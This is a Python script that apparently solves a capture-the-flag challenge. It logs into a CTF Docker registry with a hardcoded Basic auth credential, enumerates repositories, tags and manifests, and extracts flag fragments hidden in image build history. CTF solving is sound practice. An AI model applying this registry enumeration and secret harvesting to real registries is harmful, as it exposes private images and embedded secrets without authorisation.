import requests
import tarfile
import re

r = requests.get(
    url="https://devhole.hfctf.ca:8888/v2/_catalog",
    headers={
        "Authorization": "Basic cHJpdmF0ZV9yZWFkOnZ0OWdzaFlCS3c1aFVrNEtXOTBi",
    },
)
manifest = r.json()

parts = {}
for repo in manifest["repositories"]:
  repo_tags = requests.get(
    url=f"https://devhole.hfctf.ca:8888/v2/{repo}/tags/list",
    headers={
        "Authorization": "Basic cHJpdmF0ZV9yZWFkOnZ0OWdzaFlCS3c1aFVrNEtXOTBi",
    },
  )
  tags = repo_tags.json()
  for tag in tags["tags"]:
    if tag.startswith("part"):
      image_manifest = requests.get(
        url=f"https://devhole.hfctf.ca:8888/v2/{repo}/manifests/{tag}",
        headers={
            "Authorization": "Basic cHJpdmF0ZV9yZWFkOnZ0OWdzaFlCS3c1aFVrNEtXOTBi",
        },
      )
      image_manifest_json = image_manifest.json()
      history = image_manifest_json["history"][0]["v1Compatibility"]
      x = re.search("FLAGPART=([a-zA-Z0-9\-]+)", history)
      parts[int(tag[4:])] = x.group(1)
sorted_dict = dict(sorted(parts.items()))
print("".join(sorted_dict[x] for x in sorted_dict))